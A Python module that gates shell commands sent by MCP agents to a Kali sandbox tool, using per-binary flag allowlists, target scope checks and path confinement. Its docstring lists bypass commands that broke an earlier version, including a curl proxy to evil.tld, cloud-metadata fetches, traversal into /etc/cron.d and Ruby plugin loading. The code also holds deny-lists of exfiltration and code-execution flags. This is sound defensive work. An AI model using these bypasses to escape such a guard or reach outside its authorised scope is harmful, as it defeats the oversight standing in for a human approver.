"""Command admission for the inbound MCP `kali_exec` tool.

WHY THIS MODULE EXISTS
----------------------
`kali_shell` is `bash -c` on a container with NET_ADMIN, NET_RAW,
seccomp:unconfined and open egress. Inside the product that is contained by a
HUMAN clicking through the `DANGEROUS_TOOLS` confirmation
(`REQUIRE_TOOL_CONFIRMATION`). An MCP token has no human, so this module stands
in that place. It is the security boundary of the whole feature.

The Rules of Engagement gate matches on TOOL NAME only and never reads a command
string; the scope guardrail runs once per session against the project's
configured target. Neither would notice `nmap -sS victim.tld`, so neither is
sufficient here.

WHY IT IS SHAPED THIS WAY (this is the important part)
------------------------------------------------------
The first version pattern-matched arguments to guess which ones named a host,
and let everything it did not recognise through. An adversarial review broke it
ten different ways in one pass, all the same root cause: **a token the guard
declined to recognise was a token nobody checked**, and the "a network tool must
name at least one in-scope host" rule meant one good argument laundered all the
others. Confirmed bypasses included:

    curl --resolve=acme.tld:443:6.6.6.6 https://acme.tld/   (two colons -> unparsed)
    curl -xevil.tld:8080 acme.tld                           (attached short value -> skipped)
    curl acme.tld evil.tld/                                 (a trailing slash -> unparsed)
    curl acme.tld 169.254.169.254/latest/meta-data/         (cloud metadata)
    curl -o /workspace/../etc/cron.d/pwn https://acme.tld/  (prefix match, no normalisation)
    whatweb --plugins=+/tmp/p.rb https://acme.tld           (loads Ruby from a writable dir)
    dig @evil.tld acme.tld                                  (arbitrary nameserver)
    curl -K/tmp/c acme.tld                                  (config file = arbitrary curl)

So this is now DENY BY DEFAULT OVER THE FLAG SURFACE. Each binary declares every
flag it accepts and what KIND of value that flag takes; a token that is not in
the spec is refused by name. There are no unrecognised tokens, so there is
nothing to launder. The tools' own flag surfaces are the attack surface, and
that is what an allowlist has to cover.

TWO THINGS IT STILL CANNOT DO, BY CONSTRUCTION
----------------------------------------------
A pre-flight string check cannot see a REDIRECT or a DNS answer. `-L` is
therefore not allowed (the target would choose the next hop), and a hostile
in-scope DNS record still resolves where it likes. Closing those needs a runtime
egress policy on the resolved IP, which `scanners/capture_proxy/egress.py`
already implements for the capture path; routing this egress through it would
make the whole class unreachable even when this parser is wrong, which it will
be again. Tracked, not done here.
"""
from __future__ import annotations

import ipaddress
import posixpath
import re
import shlex
from dataclasses import dataclass, field
from urllib.parse import urlsplit

MAX_COMMAND_CHARS = 2000
MAX_ARGS = 64

# --- value kinds --------------------------------------------------------------

BOOL = "bool"        # takes no value
HOST = "host"        # must resolve to an in-scope host, URL or IP
PATH = "path"        # must be an absolute path inside this project's writable roots
OPAQUE = "opaque"    # free text; may not name a host, a path or a file reference
RRTYPE = "rrtype"    # a DNS record type, from a closed set

# `dig NAME TYPE` takes the record type as a second POSITIONAL. Typing it HOST
# refused every ordinary `dig acme.tld MX`; typing it OPAQUE would leave a
# positional slot unchecked, which is the mistake this module was rewritten to
# stop. A closed set is both correct and total.
DNS_RECORD_TYPES = frozenset({
    "a", "aaaa", "any", "caa", "cname", "ds", "dnskey", "hinfo", "mx", "naptr",
    "ns", "nsec", "ptr", "rrsig", "soa", "spf", "srv", "sshfp", "tlsa", "txt",
})


@dataclass(frozen=True)
class BinarySpec:
    """Everything one allowlisted program may be given."""
    flags: dict[str, str]
    positional: str = OPAQUE
    # Kind for positionals AFTER the first. None means they all take `positional`.
    positional_rest: str | None = None
    max_positional: int = 4
    # Appended to every invocation. Bounds that the caller must not be able to
    # remove, so they are added rather than merely required.
    inject: tuple[str, ...] = ()
    network: bool = True
    # Refused with a specific reason rather than the generic "unknown flag",
    # because these are the ones an agent will reach for first.
    denied: dict[str, str] = field(default_factory=dict)


_CURL_DENIED = {
    "-K": "a curl config file can set any option, including a second URL and file:// - the guard cannot see inside it",
    "--config": "a curl config file can set any option, including a second URL and file:// - the guard cannot see inside it",
    "--resolve": "it repoints a hostname at an arbitrary address, which defeats the scope check entirely",
    "--connect-to": "it repoints a hostname at an arbitrary address, which defeats the scope check entirely",
    "-x": "an arbitrary proxy is arbitrary egress",
    "--proxy": "an arbitrary proxy is arbitrary egress",
    "--variable": "curl variables expand environment variables, which would read the sandbox's secrets",
    "--expand-write-out": "curl variable expansion would read the sandbox's secrets",
    "--expand-url": "curl variable expansion would read the sandbox's secrets",
    "-L": "a redirect lets the TARGET choose the next host, which this pre-flight check cannot see. Read the Location header and request it explicitly.",
    "--location": "a redirect lets the TARGET choose the next host, which this pre-flight check cannot see. Read the Location header and request it explicitly.",
    "-T": "an upload sends local files off the box",
    "--upload-file": "an upload sends local files off the box",
    "-F": "form fields can read local files with @",
    "--form": "form fields can read local files with @",
}

SPECS: dict[str, BinarySpec] = {
    "curl": BinarySpec(
        flags={
            "-s": BOOL, "--silent": BOOL, "-S": BOOL, "--show-error": BOOL,
            "-i": BOOL, "--include": BOOL, "-I": BOOL, "--head": BOOL,
            "-k": BOOL, "--insecure": BOOL, "-v": BOOL, "--verbose": BOOL,
            "--compressed": BOOL, "--http1.1": BOOL, "--http2": BOOL,
            "-g": BOOL, "--globoff": BOOL, "-4": BOOL, "-6": BOOL,
            "-A": OPAQUE, "--user-agent": OPAQUE,
            "-H": OPAQUE, "--header": OPAQUE,
            "-X": OPAQUE, "--request": OPAQUE,
            "-d": OPAQUE, "--data": OPAQUE, "--data-raw": OPAQUE,
            "-e": OPAQUE, "--referer": OPAQUE,
            "-b": OPAQUE, "--cookie": OPAQUE,
            "-r": OPAQUE, "--range": OPAQUE,
            "-w": OPAQUE, "--write-out": OPAQUE,
            "-m": OPAQUE, "--max-time": OPAQUE,
            "--connect-timeout": OPAQUE,
            "-o": PATH, "--output": PATH,
            "--url": HOST,
        },
        positional=HOST,
        # Bounds the caller cannot drop: `kali_shell` buffers the whole response
        # in RAM inside a 1 GB container shared with every project and the in-app
        # agent, so an unbounded body is a denial of service. --proto keeps a
        # scheme the guard did not vet out of reach.
        inject=("--proto", "=http,https", "--max-time", "120", "--max-filesize", "10000000"),
        denied=_CURL_DENIED,
    ),
    "dig": BinarySpec(
        flags={
            "+short": BOOL, "+noall": BOOL, "+answer": BOOL, "+trace": BOOL,
            "+dnssec": BOOL, "+nocmd": BOOL, "+multiline": BOOL, "+tcp": BOOL,
            "-4": BOOL, "-6": BOOL, "-t": OPAQUE, "-x": OPAQUE,
        },
        positional=HOST, positional_rest=RRTYPE, max_positional=2,
        denied={"-f": "a batch file would be read from disk and each line queried unchecked"},
    ),
    "host": BinarySpec(
        flags={"-t": OPAQUE, "-a": BOOL, "-v": BOOL, "-4": BOOL, "-6": BOOL},
        # `host NAME SERVER` takes a nameserver as a SECOND positional, so one is
        # the limit: an out-of-band DNS channel is still exfiltration.
        positional=HOST, max_positional=1,
    ),
    "nslookup": BinarySpec(
        flags={"-type": OPAQUE, "-query": OPAQUE, "-debug": BOOL},
        positional=HOST, max_positional=1,
    ),
    "dnsrecon": BinarySpec(
        flags={
            "-d": HOST, "--domain": HOST, "-t": OPAQUE, "--type": OPAQUE,
            "-D": PATH, "--dictionary": PATH, "-a": BOOL, "-s": BOOL,
            "-z": BOOL, "-k": BOOL, "-w": BOOL, "-j": PATH, "--json": PATH,
        },
        positional=OPAQUE, max_positional=0,
        denied={
            "-n": "an arbitrary nameserver is an out-of-band exfiltration channel",
            "--name_server": "an arbitrary nameserver is an out-of-band exfiltration channel",
        },
    ),
    "whatweb": BinarySpec(
        flags={
            "-a": OPAQUE, "--aggression": OPAQUE, "-v": BOOL, "--verbose": BOOL,
            "--no-errors": BOOL, "-t": OPAQUE, "--max-threads": OPAQUE,
            "--open-timeout": OPAQUE, "--read-timeout": OPAQUE,
            "-U": OPAQUE, "--user-agent": OPAQUE, "--log-brief": PATH,
        },
        positional=HOST,
        denied={
            "-p": "whatweb loads plugins as Ruby source, from a directory this tool can write to",
            "--plugins": "whatweb loads plugins as Ruby source, from a directory this tool can write to",
            "--custom-plugin": "it executes caller-supplied Ruby",
            "--load-plugin": "it executes caller-supplied Ruby",
        },
    ),
    "nikto": BinarySpec(
        flags={
            "-h": HOST, "-host": HOST, "-p": OPAQUE, "-port": OPAQUE,
            "-ssl": BOOL, "-nossl": BOOL, "-nointeractive": BOOL,
            "-maxtime": OPAQUE, "-Tuning": OPAQUE, "-timeout": OPAQUE,
            "-useragent": OPAQUE, "-o": PATH, "-output": PATH, "-Format": OPAQUE,
        },
        positional=OPAQUE, max_positional=0,
        denied={
            "-config": "a nikto config file sets PLUGINDIR, EXECDIR and CLIOPTS, which the guard cannot see inside",
            "-Plugins": "it selects plugin code to load",
            "-Save": "it writes captured responses to an arbitrary directory",
        },
    ),
    "testssl": BinarySpec(
        flags={
            "--fast": BOOL, "--quiet": BOOL, "--protocols": BOOL, "--headers": BOOL,
            "--vulnerable": BOOL, "--standard": BOOL, "--server-defaults": BOOL,
            "--server-preference": BOOL, "--cipher-per-proto": BOOL, "--sneaky": BOOL,
            "--color": OPAQUE, "--severity": OPAQUE, "--jsonfile": PATH, "--logfile": PATH,
        },
        positional=HOST, max_positional=1,
        denied={
            "--openssl": "it runs a caller-named binary",
            "--bin": "it runs a caller-named binary",
            "--file": "a batch file names its own targets, which the guard cannot see",
        },
    ),
    "searchsploit": BinarySpec(
        flags={"-j": BOOL, "--json": BOOL, "-w": BOOL, "-t": BOOL, "--title": BOOL,
               "-e": BOOL, "--exact": BOOL, "-c": BOOL, "--case": BOOL},
        positional=OPAQUE, max_positional=8, network=False,
        denied={
            "--nmap": "it reads and parses a caller-named file",
            "-m": "it copies an exploit out of the database to an arbitrary path",
            "--mirror": "it copies an exploit out of the database to an arbitrary path",
        },
    ),
}

ALLOWED_BINARIES = frozenset(SPECS)
NETWORK_BINARIES = frozenset(n for n, s in SPECS.items() if s.network)
OFFLINE_BINARIES = ALLOWED_BINARIES - NETWORK_BINARIES

# Writable roots. `/workspace` is shared by EVERY project (agent and sandbox bind
# the same host directory), so a bare `/workspace/` prefix let one project read
# and overwrite another's job output. Paths there are confined to the caller's
# own project subtree.
TMP_ROOT = "/tmp/"
WORKSPACE_ROOT = "/workspace/"
# Exactly `/dev/null`, never a `/dev/` prefix: `/dev/tcp/host/port` is a bash
# network primitive and `/dev/mem` is raw memory.
WRITABLE_EXACT = frozenset({"/dev/null"})

ALLOWED_URL_SCHEMES = frozenset({"http", "https"})

# Every character here can begin a second command. `{` and `}` are absent
# deliberately: brace expansion only happens UNQUOTED, `shlex.join` quotes every
# argument, and `${...}` needs the `$` that is refused here anyway - while
# refusing braces blocked `curl -w '%{http_code}'`. curl's own variable
# expansion, the other way braces could matter, is denied by flag instead.
_METACHARACTERS = set(";|&$`><()\\\n\r\t\0")

# Underscores are allowed in the non-final labels. They are not legal in a
# HOSTname, but they are legal and routine in a DNS NAME (RFC 8552): _dmarc,
# _domainkey, _acme-challenge, and every SRV record such as _sip._tcp. Without
# them `dig _dmarc.acme.tld TXT` was refused, and a DMARC lookup that cannot be
# asked came back looking like a DMARC record that does not exist - the
# could-not-ask/found-nothing conflation this surface exists to avoid.
#
# It does not widen scope: a broader regex means MORE values are recognised as
# hosts and therefore MORE get scope-checked. Unrecognised is the unsafe side.
_DOMAIN_RE = re.compile(
    r"^(?=.{1,253}$)(?!-)[A-Za-z0-9_-]{1,63}(?<!-)"
    r"(?:\.(?!-)[A-Za-z0-9_-]{1,63}(?<!-))*"
    r"\.[A-Za-z]{2,63}\.?$"
)


class CommandRefused(Exception):
    """A refusal whose message is WRITTEN for the caller to read and act on."""


@dataclass(frozen=True)
class KaliScope:
    """The project's authorised reach, resolved once by the caller."""
    domains: tuple[str, ...] = ()
    ips: tuple[str, ...] = ()
    ip_mode: bool = False
    roe_enabled: bool = False
    roe_excluded: tuple[str, ...] = ()
    # Scopes the writable workspace subtree. Empty means no workspace access.
    project_id: str = ""

    def is_configured(self) -> bool:
        return bool(self.domains or self.ips)


def _is_ip(value: str) -> bool:
    try:
        ipaddress.ip_address(value)
        return True
    except ValueError:
        return False


def _roe_excluded(host: str, scope: KaliScope) -> bool:
    """Mirrors recon/helpers/roe_scope.py `_is_roe_excluded` (exact, CIDR,
    subdomain suffix). Kept in step deliberately: an operator who excluded a host
    from scans would not expect an ad-hoc command to reach it."""
    if not scope.roe_enabled:
        return False
    for entry in scope.roe_excluded:
        entry = (entry or "").strip().lower()
        if not entry:
            continue
        if host == entry:
            return True
        if "/" in entry:
            try:
                network = ipaddress.ip_network(entry, strict=False)
                try:
                    if ipaddress.ip_address(host) in network:
                        return True
                except ValueError:
                    pass
            except ValueError:
                pass
        elif host.endswith("." + entry):
            return True
    return False


def _in_scope(host: str, scope: KaliScope) -> bool:
    if _is_ip(host):
        for entry in scope.ips:
            entry = (entry or "").strip()
            if not entry:
                continue
            if host == entry:
                return True
            if "/" in entry:
                try:
                    if ipaddress.ip_address(host) in ipaddress.ip_network(entry, strict=False):
                        return True
                except ValueError:
                    continue
        return False

    for domain in scope.domains:
        domain = (domain or "").strip().lower().rstrip(".")
        if not domain:
            continue
        # Label boundary: `notacme.tld` must not pass for scope `acme.tld`.
        if host == domain or host.endswith("." + domain):
            return True
    return False


def _resolve_host(value: str) -> str:
    """The host a HOST-typed value names, or raise.

    Unlike the first version this NEVER returns "no host here": a HOST slot that
    cannot be resolved to exactly one hostname is refused, because an unresolved
    value is an unchecked value.
    """
    raw = (value or "").strip()
    if not raw:
        raise CommandRefused("An empty value cannot be checked against the project's scope.")

    if "://" in raw:
        parts = urlsplit(raw)
        scheme = (parts.scheme or "").lower()
        if scheme not in ALLOWED_URL_SCHEMES:
            raise CommandRefused(
                f"'{scheme}://' is not allowed: kali_exec accepts http and https URLs only."
            )
        if parts.username or parts.password or "@" in (parts.netloc or ""):
            # http://acme.tld@evil.tld/ reads as the in-scope host and connects
            # to the other one.
            raise CommandRefused(
                f"'{raw}' carries userinfo before the host, which hides the real destination."
            )
        host = parts.hostname
        if not host:
            raise CommandRefused(f"'{raw}' names no host.")
        return host.lower().rstrip(".")

    # Schemeless. Strip any path, query or fragment FIRST: `evil.tld/` and
    # `169.254.169.254/latest/meta-data/` are hosts with a path, and the first
    # version never split them off, so they were never checked.
    candidate = re.split(r"[/?#]", raw, 1)[0]
    if "@" in candidate:
        raise CommandRefused(
            f"'{raw}' carries userinfo before the host, which hides the real destination."
        )
    if candidate.startswith("["):
        # Bracketed IPv6.
        end = candidate.find("]")
        if end < 0:
            raise CommandRefused(f"'{raw}' is not a valid address.")
        inner = candidate[1:end]
        if not _is_ip(inner):
            raise CommandRefused(f"'{raw}' is not a valid address.")
        return inner.lower()
    if candidate.count(":") == 1:
        head, _, tail = candidate.partition(":")
        if not tail.isdigit():
            raise CommandRefused(
                f"'{raw}' is not a host this tool can check. Write it as a URL or host[:port]."
            )
        candidate = head
    elif candidate.count(":") > 1:
        # --resolve style host:port:addr triples, and bare IPv6.
        if _is_ip(candidate):
            return candidate.lower()
        raise CommandRefused(
            f"'{raw}' is not a host this tool can check. Write it as a URL or host[:port]."
        )

    candidate = candidate.lower().rstrip(".")
    if not candidate:
        raise CommandRefused(f"'{raw}' names no host.")
    if _is_ip(candidate):
        return candidate
    if _DOMAIN_RE.match(candidate):
        # ASCII only. A Cyrillic lookalike does not match, and is refused here
        # rather than passed through for curl to IDNA-encode into a real host.
        return candidate
    raise CommandRefused(
        f"'{raw}' is not a hostname, URL or IP address, so it cannot be checked "
        "against this project's scope."
    )


def _check_host(value: str, scope: KaliScope) -> str:
    host = _resolve_host(value)
    if _roe_excluded(host, scope):
        raise CommandRefused(
            f"'{host}' is on this project's Rules of Engagement excluded-hosts list."
        )
    if not _in_scope(host, scope):
        raise CommandRefused(
            f"'{host}' is outside this project's scope. kali_exec can only reach the target "
            "this project is configured for; it cannot be pointed somewhere else."
        )
    return host


def _check_path(value: str, scope: KaliScope) -> str:
    """An absolute, normalised path inside this project's writable roots."""
    raw = (value or "").strip()
    if raw in WRITABLE_EXACT:
        return raw
    if not raw.startswith("/"):
        # Relative paths resolve against the sandbox's cwd (/tmp), so `../etc/x`
        # escaped. Requiring absolute makes the check total.
        raise CommandRefused(
            f"'{raw}' must be an absolute path under {TMP_ROOT} or this project's "
            f"{WORKSPACE_ROOT}<projectId>/ directory."
        )
    # normpath collapses `..`, so /workspace/../etc/passwd becomes /etc/passwd
    # and fails the prefix test it used to pass.
    norm = posixpath.normpath(raw)
    if norm.startswith(TMP_ROOT):
        return norm
    if scope.project_id:
        own = f"{WORKSPACE_ROOT}{scope.project_id}/"
        if norm.startswith(own):
            return norm
    raise CommandRefused(
        f"'{raw}' points outside {TMP_ROOT} and this project's "
        f"{WORKSPACE_ROOT}{scope.project_id or '<projectId>'}/ directory. "
        "The workspace is shared between projects, so only your own subtree is writable."
    )


def _check_opaque(value: str) -> str:
    """Free text that must not smuggle a destination or a file reference."""
    raw = value or ""
    if "://" in raw:
        raise CommandRefused(
            f"'{raw}' looks like a URL in a slot that is not a target. Pass the target separately."
        )
    if raw.startswith("@"):
        # curl reads @file for -d, -b and -w.
        raise CommandRefused(
            f"'{raw}' starts with '@', which makes the tool read a local file."
        )
    if raw.startswith("/"):
        raise CommandRefused(
            f"'{raw}' looks like a path in a slot that is not a file argument."
        )
    return raw


def _split_bools(token: str, spec: BinarySpec) -> list[str] | None:
    """Decompose `-sI` into `-s -I`, but only when EVERY letter is a known
    boolean flag of this binary.

    This is what refuses an attached short value: `-xevil.tld` decomposes to
    letters that are not boolean flags, so it is rejected rather than treated as
    a flag with its value glued on, which the first version skipped entirely.
    """
    if not (len(token) > 2 and token.startswith("-") and not token.startswith("--")):
        return None
    parts = [f"-{ch}" for ch in token[1:]]
    if all(spec.flags.get(p) == BOOL for p in parts):
        return parts
    return None


def admit(command: str, scope: KaliScope) -> list[str]:
    """Return the argv to run, or raise CommandRefused saying exactly why."""
    if not isinstance(command, str) or not command.strip():
        raise CommandRefused("A command is required.")
    if len(command) > MAX_COMMAND_CHARS:
        raise CommandRefused(f"The command is longer than {MAX_COMMAND_CHARS} characters.")

    bad = sorted(_METACHARACTERS.intersection(command))
    if bad:
        raise CommandRefused(
            f"Shell metacharacters are not allowed: {' '.join(repr(c) for c in bad)}. "
            "kali_exec runs one program with arguments; it is not a shell, so pipelines, "
            "redirection, substitution and chained commands are refused."
        )

    try:
        argv = shlex.split(command)
    except ValueError as exc:
        raise CommandRefused(f"The command could not be parsed: {exc}.") from exc
    if not argv:
        raise CommandRefused("A command is required.")
    if len(argv) > MAX_ARGS:
        raise CommandRefused(f"The command has more than {MAX_ARGS} arguments.")

    program = argv[0]
    if "/" in program:
        raise CommandRefused(f"'{program}' must be a bare program name, not a path.")
    spec = SPECS.get(program)
    if spec is None:
        raise CommandRefused(
            f"'{program}' is not available to kali_exec. Allowed: "
            f"{', '.join(sorted(ALLOWED_BINARIES))}. This is a fixed allowlist of read-only "
            "tools; tools whose flags can load or run code are excluded on purpose. Call "
            "kali_toolbox to see the full sandbox toolset."
        )

    if not scope.is_configured():
        raise CommandRefused(
            "This project has no target domain or IPs configured, so no command can be "
            "scope-checked. Configure the target first."
        )

    out: list[str] = [program]
    named_hosts: list[str] = []
    positionals = 0
    pending: tuple[str, str] | None = None   # (flag, kind) awaiting its value

    for token in argv[1:]:
        if pending is not None:
            flag, kind = pending
            pending = None
            out.append(_consume(flag, kind, token, scope, named_hosts))
            continue

        looks_like_flag = token.startswith("-") or token.startswith("+")
        if looks_like_flag:
            name, sep, inline = token.partition("=")
            if name in spec.denied:
                raise CommandRefused(
                    f"'{name}' is not allowed with {program}: {spec.denied[name]}."
                )
            kind = spec.flags.get(name)
            if kind is None:
                decomposed = _split_bools(token, spec)
                if decomposed is not None:
                    out.extend(decomposed)
                    continue
                raise CommandRefused(
                    f"'{name}' is not an allowed option for {program}. Allowed: "
                    f"{', '.join(sorted(spec.flags))}. Options are allowlisted per tool, and "
                    "a value must be written as a separate argument or with '=', never "
                    "attached to a short option."
                )
            if kind == BOOL:
                if sep:
                    raise CommandRefused(f"'{name}' takes no value.")
                out.append(name)
                continue
            if sep:
                out.append(name)
                out.append(_consume(name, kind, inline, scope, named_hosts))
            else:
                out.append(name)
                pending = (name, kind)
            continue

        positionals += 1
        kind = spec.positional if positionals == 1 else (spec.positional_rest or spec.positional)
        if positionals > spec.max_positional:
            raise CommandRefused(
                f"{program} accepts at most {spec.max_positional} positional argument(s); "
                f"'{token}' is extra. Every argument has to be checkable, so a spare one is refused."
            )
        out.append(_consume("<argument>", kind, token, scope, named_hosts))

    if pending is not None:
        raise CommandRefused(f"'{pending[0]}' is missing its value.")

    if spec.network and not named_hosts:
        raise CommandRefused(
            f"'{program}' reaches the network, so it must name its target explicitly. "
            "A command whose target is implied cannot be scope-checked."
        )

    out.extend(spec.inject)
    return out


def _consume(flag: str, kind: str, value: str, scope: KaliScope, named_hosts: list[str]) -> str:
    if kind == HOST:
        named_hosts.append(_check_host(value, scope))
        return value
    if kind == PATH:
        return _check_path(value, scope)
    if kind == RRTYPE:
        if value.lower() not in DNS_RECORD_TYPES:
            raise CommandRefused(
                f"'{value}' is not a DNS record type. Allowed: "
                f"{', '.join(sorted(t.upper() for t in DNS_RECORD_TYPES))}."
            )
        return value
    if kind == OPAQUE:
        return _check_opaque(value)
    raise CommandRefused(f"'{flag}' has an unknown value kind.")


def to_shell_command(argv: list[str]) -> str:
    """Quote the admitted argv for transport through `kali_shell`'s `bash -c`.

    `shlex.join` quotes EVERY argument, so each one arrives at the program as a
    single literal token. This, not the metacharacter check, is what makes the
    transport safe.
    """
    return shlex.join(argv)
